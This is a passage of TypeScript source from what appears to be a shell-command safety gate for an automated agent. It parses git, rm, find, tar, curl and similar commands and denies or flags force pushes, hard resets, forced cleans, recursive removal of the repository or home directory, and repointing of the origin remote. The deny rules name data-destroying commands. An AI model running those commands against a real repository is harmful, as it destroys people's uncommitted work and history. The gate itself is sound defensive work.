  execChildren: CommandView[];
  command: ShellCommand;
  args: Arg[];
}

/** How a command is being judged. */
interface Mode {
  /** How many scripts deep: a script found inside an argument, inside a script, and so on. */
  nesting: number;
  /**
   * The text was only guessed to be a command (a quoted argument of an unknown
   * tool). Destructive commands in it still deny; a secret-shaped word given to
   * a command nobody knows only raises a signal, because it may be prose.
   */
  speculative: boolean;
}

/** How many scripts inside scripts are read before the rest is left as opaque. */
const MAX_SCRIPT_NESTING = 3;

function toView(command: ShellCommand, context: RuleContext): CommandView {
  return { command, args: command.args.map(word => toArg(word, context)), execChildren: [] };
}

// --- git -------------------------------------------------------------------

interface GitInvocation {
  subcommand: string | undefined;
  args: Arg[];
}

interface GitCommandLine {
  /** The subcommand as git would most likely read it. */
  primary: GitInvocation;
  /**
   * Other readings, when a global option this table does not know may or may
   * not have taken the next word as its value.
   */
  alternatives: GitInvocation[];
  directories: Arg[];
  configOverride: boolean;
  unknownGlobal: boolean;
}

/** Global options that take the next word as their value. */
const GIT_GLOBAL_VALUE: ReadonlySet<string> = new Set([
  ...['-C', '-c', '--git-dir', '--work-tree', '--namespace', '--super-prefix', '--config-env'],
  '--attr-source',
]);
const GIT_GLOBAL_FLAG =
  /^(-p|-P|--paginate|--no-pager|--bare|--no-replace-objects|--literal-pathspecs|--glob-pathspecs|--noglob-pathspecs|--icase-pathspecs|--no-optional-locks|--no-lazy-fetch|--no-advice|--version|--help|-h|-v|--html-path|--man-path|--info-path|--exec-path)$/;
const GIT_GLOBAL_ATTACHED =
  /^(--git-dir|--work-tree|--namespace|--super-prefix|--attr-source|--list-cmds)=/;
/** Subcommands with a deny rule or a risk signal of their own. */
const GIT_JUDGED: ReadonlySet<string> = new Set([
  ...['push', 'reset', 'clean', 'rebase', 'branch', 'tag', 'checkout', 'restore', 'switch'],
  ...['stash', 'read-tree', 'checkout-index', 'update-ref', 'reflog', 'gc', 'prune', 'rm'],
  ...['filter-branch', 'filter-repo', 'clone', 'worktree', 'init', 'config', 'apply', 'am'],
  ...['archive', 'bundle', 'format-patch', 'credential'],
]);

function parseGit(args: readonly Arg[]): GitCommandLine {
  const line: GitCommandLine = {
    primary: { subcommand: undefined, args: [] },
    alternatives: [],
    directories: [],
    configOverride: false,
    unknownGlobal: false,
  };
  let i = 0;
  while (i < args.length) {
    const arg = args[i];
    if (arg === undefined || arg.dynamic) break;
    const text = arg.text;
    if (!text.startsWith('-')) {
      line.primary = { subcommand: text, args: args.slice(i + 1) };
      break;
    }
    if (text === '-C') {
      const directory = args[i + 1];
      if (directory !== undefined) line.directories.push(directory);
    }
    if (text === '-c' || text.startsWith('--config-env') || text.startsWith('--exec-path=')) {
      line.configOverride = true;
    }
    if (GIT_GLOBAL_VALUE.has(text)) {
      i += 2;
    } else {
      // An option this table does not know may take a value, which would make
      // the next word that value and the one after it the subcommand.
      const known =
        GIT_GLOBAL_FLAG.test(text) || GIT_GLOBAL_ATTACHED.test(text) || text.includes('=');
      if (!known) line.unknownGlobal = true;
      i++;
    }
  }
  if (line.unknownGlobal) {
    args.forEach((arg, index) => {
      if (index <= i || arg.dynamic || !GIT_JUDGED.has(arg.text)) return;
      line.alternatives.push({ subcommand: arg.text, args: args.slice(index + 1) });
    });
  }
  return line;
}

/**
 * The branch a checkout has out, read from its `HEAD` file. `undefined` for a
 * detached head, or when no checkout is found at or above `directory`.
 */
async function currentBranch(directory: string | undefined): Promise<string | undefined> {
  let at = directory;
  while (at !== undefined) {
    const dotGit = join(at, '.git');
    let gitDir: string | undefined;
    try {
      if ((await stat(dotGit)).isDirectory()) {
        gitDir = dotGit;
      } else {
        // A linked worktree: `.git` is a file naming the real git directory.
        const pointer = /^gitdir:\s*(.+)$/m.exec(await readFile(dotGit, 'utf8'))?.[1];
        gitDir = pointer === undefined ? undefined : resolve(at, pointer.trim());
      }
    } catch {
      // No `.git` here: look one directory up.
    }
    if (gitDir !== undefined) {
      try {
        const head = await readFile(join(gitDir, 'HEAD'), 'utf8');
        return /^ref:\s*refs\/heads\/(.+)$/m.exec(head)?.[1]?.trim();
      } catch {
        return undefined;
      }
    }
    const parent = dirname(at);
    at = parent === at ? undefined : parent;
  }
  return undefined;
}

/** Commands whose whole output is the name of the branch that is checked out. */
const CURRENT_BRANCH_COMMANDS: ReadonlySet<string> = new Set([
  'git branch --show-current',
  'git rev-parse --abbrev-ref HEAD',
  'git symbolic-ref --short HEAD',
]);

function namesCurrentBranch(refspec: Arg): boolean {
  if (!refspec.dynamic) return refspec.text === 'HEAD' || refspec.text === '@';
  const [only] = refspec.nested;
  return (
    refspec.nested.length === 1 &&
    only !== undefined &&
    /^\$\([^)]*\)$/.test(refspec.text) &&
    CURRENT_BRANCH_COMMANDS.has(only.text.trim().replace(/\s+/g, ' '))
  );
}

/** The branch a push refspec writes to. `undefined` when the refspec does not name one. */
function pushDestination(refspec: string): string | undefined {
  // `heads/main` and `refs/heads/main` both resolve to the branch `main` on the remote.
  const destination = refspec
    .slice(refspec.lastIndexOf(':') + 1)
    .replace(/^\+/, '')
    .replace(/^(refs\/)?heads\//, '');
  return destination === '' || destination === 'HEAD' || destination === '@'
    ? undefined
    : destination;
}

/** Push options that change neither where a push goes nor what it may overwrite or remove. */
const PLAIN_PUSH_FLAGS: ReadonlySet<string> = new Set([
  ...['-u', '--set-upstream', '--force-with-lease', '-q', '--quiet', '-v', '--verbose'],
  '--no-verify',
]);

const ORIGIN = 'origin';

/** Config keys that decide which remote, URL or branch a later push or fetch uses. */
const REMOTE_ROUTING_KEY =
  /^(remote\.|branch\..+\.(remote|pushremote|merge)$|url\..+\.(insteadof|pushinsteadof)$|push\.default$)/i;

async function judgeGitPush(
  parsed: Options,
  scope: ShellScope,
  gitDirectory: string | undefined
): Promise<void> {
  const { context, judgement } = scope;
  const refspecs = parsed.positionals.slice(1);
  const isProtected = (branch: string | undefined): boolean =>
    branch === undefined || context.protectedBranches.includes(branch);

  const forced = hasOption(parsed, '-f', '--force');
  // Git accepts any unambiguous prefix: `--force-w` is the lease flag.
  const lease = hasAbbreviated(parsed, '--force-with-lease', '--force-w');
  const mirror = hasOption(parsed, '--mirror');
  const everything = mirror || hasOption(parsed, '--all', '--branches');

  if (forced || refspecs.some(refspec => refspec.text.startsWith('+')) || (mirror && !lease)) {
    // A mirror push force-updates every remote ref and deletes the ones missing locally.
    deny(judgement, 'deny.git_force_push');
  } else if (lease) {
    // With no refspec git pushes the branch that is checked out.
    const named = refspecs.length === 0 ? [plainPath('HEAD')] : refspecs;
    const current = named.some(namesCurrentBranch) ? await currentBranch(gitDirectory) : undefined;
    const destinations = named.map(refspec => {
      if (namesCurrentBranch(refspec)) return current;
      return refspec.dynamic || refspec.glob ? undefined : pushDestination(refspec.text);
    });
    if (everything || destinations.some(isProtected)) {
      deny(judgement, 'deny.git_force_push_protected');
    }
  }

  // Deleting a branch on the remote: `--delete main`, or the refspec `:main`.
  const deleted = hasOption(parsed, '-d', '--delete')
    ? refspecs
    : refspecs.filter(refspec => refspec.text.startsWith(':'));
  if (deleted.some(refspec => !refspec.dynamic && isProtected(pushDestination(refspec.text)))) {
    deny(judgement, 'deny.git_force_push_protected');
  }

  // Where the push lands, as far as the command and the checkout show it.
  const checkedOut = await currentBranch(gitDirectory);
  const pushed = refspecs.length === 0 ? [plainPath('HEAD')] : refspecs;
  const landsOn = pushed.map(refspec => {
    if (namesCurrentBranch(refspec)) return checkedOut;
    return refspec.dynamic || refspec.glob ? undefined : pushDestination(refspec.text);
  });
  // `HEAD`, or the checked-out branch by its own name: nothing else is the run's own push.
  const ownBranchOnly = pushed.every(
    refspec => namesCurrentBranch(refspec) || (!refspec.dynamic && refspec.text === checkedOut)
  );
  let target: NonNullable<EscalationFacts['gitPushTarget']>;
  if (deleted.length > 0) target = 'deletes_remote_ref';
  else if (everything || hasOption(parsed, '--tags', '--follow-tags'))
    target = 'several_or_all_refs';
  else if (landsOn.includes(undefined)) target = 'unknown';
  else if (landsOn.some(isProtected)) target = 'protected_branch';
  else if (ownBranchOnly) target = 'checked_out_branch';
  else target = 'other_unprotected_branch';
  noteFact(judgement.facts, 'gitPushTarget', target);

  // The ordinary push of a run: its own checked-out, unprotected branch, to a
  // configured remote, without the force flag. Nothing about it is left to judge.
  const [remote] = parsed.positionals;
  // `origin`, named or implied: the one remote whose address a rule keeps fixed
  // (see `deny.git_push_destination_change`). Any other remote stays flagged.
  const configuredRemote = remote === undefined || (!remote.dynamic && remote.text === ORIGIN);
  // Any other option may change where the push goes or what it removes
  // (`--repo`, `--prune`, `--receive-pack`), so it leaves the push flagged.
  const plainOptions =
    parsed.values.size === 0 &&
    [...parsed.flags].every(flag => PLAIN_PUSH_FLAGS.has(flag.split('=')[0] ?? flag));
  if (
    target === 'checked_out_branch' &&
    configuredRemote &&
    plainOptions &&
    judgement.deny === undefined
  ) {
    return;
  }
  signal(judgement, 'risk.mutation_verb', 'unlikely');
}

/** Paths a git subcommand writes outside what git itself tracks. */
function gitWriteTargets(subcommand: string, parsed: Options, context: RuleContext): Arg[] {
  const { positionals } = parsed;
  switch (subcommand) {
    case 'clone':
      return positionals.slice(1, 2);
    case 'init':
      return positionals.slice(0, 1);
    case 'worktree':
      return positionals[0]?.text === 'add' ? positionals.slice(1, 2) : [];
    case 'bundle':
      return positionals[0]?.text === 'create' ? positionals.slice(1, 2) : [];
    case 'apply':
    case 'am':
      return valuesOf(parsed, '--directory');
    case 'archive':
      return valuesOf(parsed, '-o', '--output');
    case 'format-patch':
      return valuesOf(parsed, '-o', '--output-directory');
    case 'config': {
      const reads =
        hasOption(parsed, '--get', '--get-all', '--get-regexp', '--list', '-l') ||
        (positionals.length < 2 && !hasOption(parsed, '--unset', '--unset-all', '--edit', '-e'));
      if (reads) return [];
      const files = valuesOf(parsed, '-f', '--file');
      if (hasOption(parsed, '--global')) files.push(plainPath(join(context.homeDir, '.gitconfig')));
      if (hasOption(parsed, '--system')) files.push(plainPath('/etc/gitconfig'));
      return files;
    }
    default:
      return valuesOf(parsed, '--output');
  }
}

/**
 * Whether one of a checkout's or restore's operands is the whole working tree:
 * the repository root (or a directory holding it), git's `:/`, pathspec magic,
 * or a wildcard that takes everything there.
 *
 * Git expands wildcards in a pathspec itself, so a quoted `'*'` reaches as far
 * as an unquoted one: the quoting is not looked at.
 */
async function coversWholeTree(operands: readonly Arg[], scope: ShellScope): Promise<boolean> {
  for (const operand of operands) {
    if (operand.dynamic) continue;
    // `:/` is the top of the tree; `:(glob)**` and the rest of the magic are not read here.
    if (operand.text.startsWith(':/') || operand.text.startsWith(':(')) return true;
    let text = operand.text;
    const wildcard = text.search(/[*?[]/);
    if (wildcard !== -1) {
      // `*`, `**/*`, `./*`: nothing but wildcards from here on takes the whole directory.
      if (!/^[*?.[\]!^/]+$/.test(text.slice(wildcard))) continue;
      text = text.slice(0, wildcard);
      text = text.slice(0, text.lastIndexOf('/') + 1) || '.';
    }
    const where = await locate(text, scope.cwd, scope.context);
    if (where.kind === 'resolved' && isInside(where.real, scope.context.repoRoot)) return true;
  }
  return false;
}

/**
 * Whether a checkout's or restore's operand is a wildcard, quoted or not. Git
 * expands a pathspec wildcard across directories, so what it reaches cannot be
 * sized here: a discard through one is treated like a discard of the tree.
 */
function hasWildcard(operands: readonly Arg[]): boolean {
  return operands.some(operand => !operand.dynamic && /[*?[]/.test(operand.text));
}

/** How much a path-scoped checkout or restore throws away, as far as its operands show. */
function discardScope(operands: readonly Arg[]): NonNullable<EscalationFacts['uncommittedWork']> {
  return operands.some(operand => operand.dynamic) ? 'unknown' : 'discarded_in_named_paths';
}

/** Raises the signal for git commands that throw away work or history without a deny rule. */
async function judgeGitDiscard(
  subcommand: string,
  parsed: Options,
  raw: readonly Arg[],
  scope: ShellScope
): Promise<void> {
  const { judgement } = scope;
  const { positionals } = parsed;
  const verb = positionals[0]?.text;
  let discards = false;
  let hint: ReversibleHint = 'unknown';
  switch (subcommand) {
    case 'rebase':
    case 'filter-branch':
    case 'filter-repo':
      discards = true;
      hint = subcommand === 'rebase' ? 'likely' : 'unlikely';
      break;
    case 'branch':
      discards =
        hasOption(parsed, '-D') ||
        (hasOption(parsed, '-d', '--delete') && hasOption(parsed, '-f', '--force'));
      hint = 'likely';
      break;
    case 'tag':
      discards = hasOption(parsed, '-d', '--delete');
      hint = 'likely';
      break;
    case 'checkout': {
      if (hasOption(parsed, '-f', '--force') || (await coversWholeTree(positionals, scope))) {
        deny(judgement, 'deny.git_discard_worktree');
      }
      // `git checkout <branch>` is ordinary; with a path it overwrites the file.
      const paths = await Promise.all(
        positionals.map(async arg => {
          if (arg.dynamic) return false;
          if (arg.text === '.' || arg.text.endsWith('/')) return true;
          const where = await locate(arg.text, scope.cwd, scope.context);
          return where.kind === 'resolved' && where.exists;
        })
      );
      discards =
        hasOption(parsed, '-f', '--force', '-p', '--patch') ||
        raw.some(arg => arg.text === '--') ||
        paths.includes(true);
      if (discards && hasWildcard(positionals)) deny(judgement, 'deny.git_discard_worktree');
      if (discards) noteFact(judgement.facts, 'uncommittedWork', discardScope(positionals));
      break;
    }
    case 'restore':
      // `--staged` alone only unstages; anything touching the worktree overwrites files.
      discards = !hasOption(parsed, '--staged', '-S') || hasOption(parsed, '--worktree', '-W');
      if (discards && ((await coversWholeTree(positionals, scope)) || hasWildcard(positionals))) {
        deny(judgement, 'deny.git_discard_worktree');
      }
      if (discards) noteFact(judgement.facts, 'uncommittedWork', discardScope(positionals));
      break;
    case 'switch':
      discards = hasOption(parsed, '--discard-changes', '-f', '--force');
      if (discards) deny(judgement, 'deny.git_discard_worktree');
      break;
    case 'stash':
      discards = verb === 'drop' || verb === 'clear';
      break;
    case 'reflog':
      discards = verb === 'expire' || verb === 'delete';
      hint = 'unlikely';
      break;
    case 'gc':
      discards = [...parsed.flags].some(flag => flag.startsWith('--prune'));
      hint = 'unlikely';
      break;
    case 'checkout-index':
      discards = hasOption(parsed, '-f', '--force');
      if (discards && hasOption(parsed, '-a', '--all'))
        deny(judgement, 'deny.git_discard_worktree');
      break;
    case 'rm':
      discards = !hasOption(parsed, '--cached');
      hint = 'likely';
      break;
    case 'read-tree':
    case 'update-ref':
    case 'prune':
      discards = true;
      break;
    // Not a loss of work, but a change to where the checkout's pushes go. A push
    // of the checked-out branch to `origin` raises no signal, which holds only
    // while `origin` is what the checkout was given: changing it is denied.
    case 'remote': {
      const names = positionals.slice(1).filter(arg => !arg.dynamic);
      if (verb === 'add') {
        // A new remote under another name changes no existing push; pushes to it stay flagged.
        if (names.some(arg => arg.text === ORIGIN))
          deny(judgement, 'deny.git_push_destination_change');
        discards = true;
      } else if (verb !== undefined && !['show', 'get-url'].includes(verb)) {
        const repoints = ['set-url', 'rename', 'remove', 'rm'].includes(verb);
        const unnamed = positionals.slice(1).some(arg => arg.dynamic);
        if (repoints && (unnamed || names.some(arg => arg.text === ORIGIN))) {
          deny(judgement, 'deny.git_push_destination_change');
        }
        discards = true;
      }
      hint = 'likely';
      break;
    }
    case 'config': {
      const [key, value] = positionals;
      const writes =
        value !== undefined ||
        hasOption(parsed, '--add', '--replace-all', '--unset', '--unset-all', '--rename-section');
      if (key !== undefined && !key.dynamic && writes && REMOTE_ROUTING_KEY.test(key.text)) {
        deny(judgement, 'deny.git_push_destination_change');
      }
      // A key in a variable may be one of those: flagged, since it cannot be read.
      discards = key?.dynamic && writes;
      hint = 'likely';
      break;
    }
    default:
      break;
  }
  if (discards) signal(judgement, 'risk.mutation_verb', hint);
}

async function judgeGitSubcommand(
  invocation: GitInvocation,
  scope: ShellScope,
  gitDirectory: string | undefined
): Promise<Options | undefined> {
  const { subcommand } = invocation;
  const { context, judgement } = scope;
  if (subcommand === undefined) return undefined;
  const parsed = parseOptions(invocation.args, GIT_OPTION_SPECS[subcommand]);
  // A deny rule that turns on a flag cannot be settled when the flag sits in a variable.
  const hidden = invocation.args.some(arg => arg.dynamic);

  // Options that make git run another program.
  if (
    hasOption(
      parsed,
      '--ext-diff',
      '--textconv',
      '-O',
      '--open-files-in-pager',
      '--unsafe-paths'
    ) ||
    hasOption(parsed, '--exec', '--upload-pack', '--receive-pack')
  ) {
    signal(judgement, 'risk.opaque_shell');
  }
  for (const target of gitWriteTargets(subcommand, parsed, context)) {
    await judgeWriteTarget(target, scope);
  }

  switch (subcommand) {
    case 'push':
      await judgeGitPush(parsed, scope, gitDirectory);
      break;
    case 'reset':
      if (hasAbbreviated(parsed, '--hard', '--h')) deny(judgement, 'deny.git_reset_hard');
      else if (hidden) signal(judgement, 'risk.opaque_shell');
      break;
    case 'clean':
      if (hidden) signal(judgement, 'risk.opaque_shell');
      // `-e` takes a pattern, so `-en` and `-e -n` are an exclude, not a dry run.
      if (hasOption(parsed, '-n') || hasAbbreviated(parsed, '--dry-run', '--d')) break;
      // Untracked files cannot be brought back. The force flag is not required
      // for the deny: `clean.requireForce=false` makes git run without it.
      if (hasOption(parsed, '-f', '-d', '-x', '-X') || hasAbbreviated(parsed, '--force', '--f')) {
        deny(judgement, 'deny.git_clean_force');
      } else {
        signal(judgement, 'risk.mutation_verb');
      }
      break;
    default:
      await judgeGitDiscard(subcommand, parsed, invocation.args, scope);
      break;
  }
  return parsed;
}

/** Returns whether this git call is a known read-only one. */
async function judgeGit(view: CommandView, scope: ShellScope): Promise<boolean> {
  const { context, judgement } = scope;
  const line = parseGit(view.args);
  if (line.configOverride || line.unknownGlobal) signal(judgement, 'risk.opaque_shell');

  // `git -C dir` runs there: the branch that matters is that checkout's.
  let gitDirectory = scope.cwd;
  for (const directory of line.directories) {
    const where = directory.dynamic
      ? undefined
      : await locate(directory.text, gitDirectory, context);
    if (where?.kind === 'resolved') gitDirectory = where.real;
    else gitDirectory = undefined;
    if (directory.dynamic) {
      signal(judgement, 'risk.opaque_shell');
    } else if (where?.kind !== 'resolved' || !where.inside) {
      signal(judgement, 'risk.cwd_outside_root');
      judgement.unplaced = true;
    }
  }

  // The subcommand itself sits in a variable: `git $SUB --hard`.
  if (line.primary.subcommand === undefined && view.args.some(arg => arg.dynamic)) {
    signal(judgement, 'risk.opaque_shell');
  }

  for (const alternative of line.alternatives) {
    await judgeGitSubcommand(alternative, scope, gitDirectory);
  }
  const parsed = await judgeGitSubcommand(line.primary, scope, gitDirectory);
  const { subcommand } = line.primary;

  if (parsed === undefined || subcommand === undefined || !READ_ONLY_GIT.has(subcommand)) {
    return false;
  }
  if (line.configOverride || line.unknownGlobal || parsed.values.has('--output')) return false;
  if (hasOption(parsed, '--ext-diff', '--textconv', '-O', '--open-files-in-pager')) return false;
  if (subcommand === 'branch') {
    const lists = [...parsed.flags].every(flag => GIT_BRANCH_LIST_FLAGS.test(flag));
    return parsed.positionals.length === 0 && lists;
  }
  if (subcommand === 'remote') {
    const [verb] = parsed.positionals;
    return verb === undefined || verb.text === 'show' || verb.text === 'get-url';
  }
  return true;
}

// --- removal ---------------------------------------------------------------

function stripTrailingSlashes(text: string): string {
  const stripped = text.replace(/\/+$/, '');
  return stripped === '' && text !== '' ? '/' : stripped;
}

/** Whether a directory is one whose recursive removal is never acceptable. */
async function isRootLikeDirectory(text: string, scope: ShellScope): Promise<boolean> {
  const { context } = scope;
  const trimmed = stripTrailingSlashes(text);
  const where = await locate(trimmed, scope.cwd, context);
  // Where the shell stands is unknown (a `cd` into a variable): `.` and `..` may be the root.
  if (where.kind !== 'resolved') return trimmed === '.' || trimmed === '..';
  // The root itself, the home directory, or anything that contains the root ("/" included).
  if (
    where.real === context.homeDir ||
    [context.repoRoot, ...(context.extraWriteRoots ?? [])].some(root => isInside(where.real, root))
  ) {
    return true;
  }
  // The repository's git data: removing it takes history, stashes and settings with it.
  return isInside(join(context.repoRoot, '.git'), where.real);
}

async function isRootLikeRemoval(target: ResolvedWord, scope: ShellScope): Promise<boolean> {
  if (target.dynamic) return false;
  if (!target.glob) return isRootLikeDirectory(target.text, scope);
  // A bare glob: nothing but wildcards, dots and bracket syntax in the last
  // segment (`*`, `.*`, `.[!.]*`), so it names no particular file. It empties
  // the directory it is anchored in, which is judged like that directory.
  const lastSlash = target.text.lastIndexOf('/');
  const name = target.text.slice(lastSlash + 1);
  if (!/^[*?.[\]!^]+$/.test(name)) return false;
  return isRootLikeDirectory(target.text.slice(0, lastSlash + 1) || '.', scope);
}

/**
 * Whether everything a removal names lies in a build, install or cache
 * directory of the repository: output a build makes again. A glob counts by
 * the directory it is anchored in. States the fact either way.
 */
async function removesOnlyBuildOutput(
  targets: readonly ResolvedWord[],
  scope: ShellScope
): Promise<boolean> {
  const { context, judgement } = scope;
  let placed = targets.length > 0;
  let buildOutput = placed;
  for (const target of targets) {
    if (target.dynamic) {
      placed = false;
      break;
    }
    let text = target.text;
    if (target.glob) {
      // The directory the glob is anchored in, as `judgeWriteTarget` takes it.
      text = text.slice(0, text.search(/[*?[]/));
      text = text.slice(0, text.lastIndexOf('/') + 1) || '.';
    }
    const where = await locate(text, scope.cwd, context);
    if (where.kind !== 'resolved' || !where.inside) {
      placed = false;
      break;
    }
    if (!isBuildOutputPath(relative(context.repoRoot, where.real))) buildOutput = false;
  }
  if (!placed) {
    noteFact(judgement.facts, 'removalTarget', 'unknown');
    return false;
  }
  noteFact(
    judgement.facts,
    'removalTarget',
    buildOutput ? 'build_or_cache_output' : 'other_repository_path'
  );
  return buildOutput;
}

/** Judges paths a command removes; `recursive` adds the never-acceptable directories. */
async function judgeRemoval(
  targets: readonly ResolvedWord[],
  recursive: boolean,
  scope: ShellScope,
  buildOutput = false
): Promise<void> {
  for (const target of targets) {
    if (recursive && (await isRootLikeRemoval(target, scope))) {
      deny(scope.judgement, 'deny.rm_recursive_root');
    }
    await judgeWriteTarget(target, scope, buildOutput);
  }
}

async function judgeRm(view: CommandView, scope: ShellScope): Promise<void> {
  const parsed = parseOptions(view.args);
  // rimraf is `rm -rf` whatever its flags say.
  const recursive =
    view.command.head === 'rimraf' ||
    hasOption(parsed, '-r', '-R') ||
    hasAbbreviated(parsed, '--recursive', '--r');
  const buildOutput = await removesOnlyBuildOutput(parsed.positionals, scope);
  // Removing what a build makes again is not a risk signal of its own.
  if (buildOutput) scope.judgement.settled.add(view.command);
  await judgeRemoval(parsed.positionals, recursive, scope, buildOutput);
}

/** find: the files its actions write, and what `-delete` removes. */
async function judgeFind(view: CommandView, scope: ShellScope): Promise<void> {
  const { args } = view;
  for (const [index, arg] of args.entries()) {
    const file = args[index + 1];
    if (!arg.dynamic && FIND_FILE_ACTIONS.has(arg.text) && file !== undefined) {
      await judgeWriteTarget(file, scope);
    }
  }
  if (!args.some(arg => arg.text === '-delete')) return;
  const expression = args.findIndex(arg => !arg.dynamic && /^(-|\(|!)/.test(arg.text));
  const starts = args.slice(0, expression === -1 ? args.length : expression);
  // `find . -delete` empties the tree. A test before it (`-name '*.pyc'`)
  // narrows what goes to something this gate cannot enumerate: that escalates.
  const filtered = args
    .slice(expression === -1 ? args.length : expression)
    .some(arg => arg.dynamic || (arg.text.startsWith('-') && !FIND_UNFILTERED.test(arg.text)));
  const removed = starts.length > 0 ? starts : [plainPath('.')];
  const buildOutput = await removesOnlyBuildOutput(removed, scope);
  await judgeRemoval(removed, !filtered, scope, buildOutput);
  if (!buildOutput) signal(scope.judgement, 'risk.mutation_verb');
}

// --- write targets ---------------------------------------------------------

type TargetChoice = 'all' | 'first' | 'last' | 'after_first' | 'none';

interface Writer {
  /** Which operands the command writes, moves or removes. */
  targets: TargetChoice;
  /** Options whose value is a file or directory written. */
  writes?: readonly string[];
  /** Options naming the directory operands go into; with one given, `last` no longer applies. */
  into?: readonly string[];
}

const TARGET_DIRECTORY: readonly string[] = ['-t', '--target-directory'];
const COMPILER: Writer = { targets: 'none', writes: ['-o', '--out-dir'] };

/** Commands that write, move or remove the files they are given, and which operands those are. */
const WRITERS: Readonly<Record<string, Writer>> = {
  tee: { targets: 'all' },
  touch: { targets: 'all' },
  mkdir: { targets: 'all' },
  rmdir: { targets: 'all' },
  truncate: { targets: 'all' },
  shred: { targets: 'all' },
  unlink: { targets: 'all' },
  script: { targets: 'all' },
  mv: { targets: 'all', into: TARGET_DIRECTORY },
  cp: { targets: 'last', into: TARGET_DIRECTORY },
  install: { targets: 'last', into: TARGET_DIRECTORY },
  ln: { targets: 'last', into: TARGET_DIRECTORY },
  rsync: { targets: 'last' },
  zip: { targets: 'first' },
  patch: {
    targets: 'first',
    writes: ['-d', '--directory', '-o', '--output', '-r', '--reject-file'],
  },
  unzip: { targets: 'none', writes: ['-d'] },
  sort: { targets: 'none', writes: ['-o', '--output'] },
  gpg: { targets: 'none', writes: ['-o', '--output'] },
  openssl: { targets: 'none', writes: ['-out', '-keyout'] },
  gcc: COMPILER,
  'g++': COMPILER,
  cc: COMPILER,
  clang: COMPILER,
  'clang++': COMPILER,
  rustc: COMPILER,
  ld: COMPILER,
  chmod: { targets: 'after_first' },
  chown: { targets: 'after_first' },
  chgrp: { targets: 'after_first' },
};

/** `host:path` and `user@host:path`: the far end of an rsync or scp, not a local file. */
const REMOTE_PATH = /^[^/]+:/;

function chooseTargets(positionals: Arg[], choice: TargetChoice): Arg[] {
  if (choice === 'none') return [];
  if (choice === 'all') return positionals;
  if (choice === 'first') return positionals.slice(0, 1);
  if (choice === 'after_first') return positionals.slice(1);
  const last = positionals.length >= 2 ? positionals.slice(-1) : [];
  return last.filter(target => !REMOTE_PATH.test(target.text));
}

const HERE: Arg = plainPath('.');

/** tar: where it writes depends on whether it creates an archive or extracts one. */
function tarTargets(args: readonly Arg[], judgement: Judgement): Arg[] {
  const spec: OptionSpec = {
    valueShort: 'fCbTXKNVgIH',
    valueLong: [
      ...['--file', '--directory', '--exclude', '--files-from', '--exclude-from', '--transform'],
      ...['--strip-components', '--to-command', '--use-compress-program', '--checkpoint-action'],
    ],
  };
  // Old style: the first word is a bundle of letters with no dash, and each
  // letter that takes a value takes the next unused word (`tar xfC a.tar dir`).
  const [bundle, ...rest] = args;
  const oldStyle = bundle !== undefined && !bundle.dynamic && /^[A-Za-z]+$/.test(bundle.text);
  const parsed = parseOptions(oldStyle ? [{ ...bundle, text: `-${bundle.text}` }] : [], spec);
  let operands = oldStyle ? rest : [...args];
  if (oldStyle) {
    for (const letter of bundle.text) {
      if (!(spec.valueShort ?? '').includes(letter)) continue;
      const value = operands[0];
      if (value !== undefined) parsed.values.set(`-${letter}`, [value]);
      operands = operands.slice(1);
    }
  }
  const later = parseOptions(operands, spec);
  for (const flag of later.flags) parsed.flags.add(flag);
  for (const [name, values] of later.values) {
    parsed.values.set(name, [...(parsed.values.get(name) ?? []), ...values]);
  }
  if (hasOption(parsed, '--to-command', '--use-compress-program', '-I', '--checkpoint-action')) {
    signal(judgement, 'risk.opaque_shell');
  }
  if (hasOption(parsed, '-x', '--extract', '--get')) {
    const into = valuesOf(parsed, '-C', '--directory');
    return into.length > 0 ? into : [HERE];
  }
  if (hasOption(parsed, '-c', '--create', '-r', '--append', '-u', '--update', '-A')) {
    return valuesOf(parsed, '-f', '--file');
  }
  return [];
}

/** Output options spelled with one dash, as Go-style tools take them: `-output file`, `-out=file`. */
const SINGLE_DASH_OUTPUT = /^-(out|output|outfile|output-file|out-dir|outdir|log-file)(?:=(.*))?$/;

function singleDashOutputs(args: readonly Arg[]): Arg[] {
  return args.flatMap((arg, index) => {
    const match = arg.dynamic ? null : SINGLE_DASH_OUTPUT.exec(arg.text);
    if (match === null) return [];
    if (match[2] !== undefined) return [{ ...arg, text: match[2] }];
    const next = args[index + 1];
    return next === undefined ? [] : [next];
  });
}

/** Collects the files a command writes through its own arguments. */
function writeTargets(view: CommandView, judgement: Judgement): Arg[] {
  const { command, args } = view;
  const { head } = command;
  const parsed = parseOptions(args, specFor(head));
  const writer = WRITERS[head];
  if (writer !== undefined) {
    const written = valuesOf(parsed, ...(writer.writes ?? []));
    const into = valuesOf(parsed, ...(writer.into ?? []));
    // With a target directory given, every operand is a source except for mv, which removes them.
    if (into.length > 0 && writer.targets === 'last') return [...written, ...into];
    return [...written, ...into, ...chooseTargets(parsed.positionals, writer.targets)];
  }

  switch (head) {
    case 'tar':
      return tarTargets(args, judgement);
    case 'dd':
      return args
        .filter(arg => arg.text.startsWith('of='))
        .map(arg => ({ ...arg, text: arg.text.slice('of='.length) }));
    case 'sed': {
      if (!hasOption(parsed, '-i') && !hasAbbreviated(parsed, '--in-place', '--in-')) return [];
      const scripted = valuesOf(parsed, ...PATTERN_FLAGS).length > 0;
      return scripted ? parsed.positionals : parsed.positionals.slice(1);
    }
    case 'perl':
      return hasOption(parsed, '-i') ? parsed.positionals : [];
    case 'xxd':
      return hasOption(parsed, '-r') ? parsed.positionals.slice(1, 2) : [];
    case 'gzip':
    case 'gunzip':
    case 'bzip2':
    case 'xz':
    case 'zstd':
      // Compressors replace the file in place unless told to write to stdout.
      return hasOption(parsed, '-c', '--stdout', '-t', '--test', '-l', '--list')
        ? []
        : parsed.positionals;
    case 'curl': {
      const directory = valuesOf(parsed, '--output-dir');
      const named = valuesOf(
        parsed,
        ...['-o', '--output', '-D', '--dump-header', '-c', '--cookie-jar', '--trace'],
        ...['--trace-ascii', '--stderr', '--etag-save', '--hsts', '--alt-svc']
      );
      const remoteName = hasOption(parsed, '-O', '--remote-name', '--remote-name-all');
      return [...named, ...directory, ...(remoteName && directory.length === 0 ? [HERE] : [])];
    }
    case 'wget': {
      const logs = valuesOf(
        parsed,
        ...['-o', '--output-file', '-a', '--append-output', '--save-cookies', '--warc-file']
      );
      const documents = valuesOf(parsed, '-O', '--output-document');
      if (documents.length > 0) return [...logs, ...documents];
      const prefixes = valuesOf(parsed, '-P', '--directory-prefix');
      return [...logs, ...(prefixes.length > 0 ? prefixes : [HERE])];
    }
    default:
      // A tool with no entry: the output options most tools share.
